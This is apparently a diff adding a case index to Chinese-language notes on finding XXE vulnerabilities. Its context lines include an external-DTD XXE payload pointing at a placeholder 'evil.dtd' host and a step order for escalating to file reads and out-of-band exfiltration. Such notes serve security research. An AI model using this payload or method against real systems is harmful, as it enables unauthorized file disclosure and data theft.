@@ -63,3 +63,12 @@ XML：`<!DOCTYPE r [<!ENTITY % dtd SYSTEM "<DTD_URL>/evil.dtd"> %dtd;]>`。
 | CSS/HTML 实体载体 | 982291 |
 
 hunt 顺序：①判解析 → 有回显走②读文件 → 无回显走③ OAST → 仍不中挂④外部 DTD 报错外带。
+
+## 更多真实案例（第三轮单例补充）
+
+（来自第二轮单例、第三轮语义路由归入本类；仅列此前未收录的报告，作案例索引）
+
+- **XXE配置错误**
+  - #1095645 LIBXML_NOENT 标志导致 XXE（框架行为变化）
+- **XXE利用**
+  - #845832 SVG 上传触发 XXE 进而 SSRF/LFI
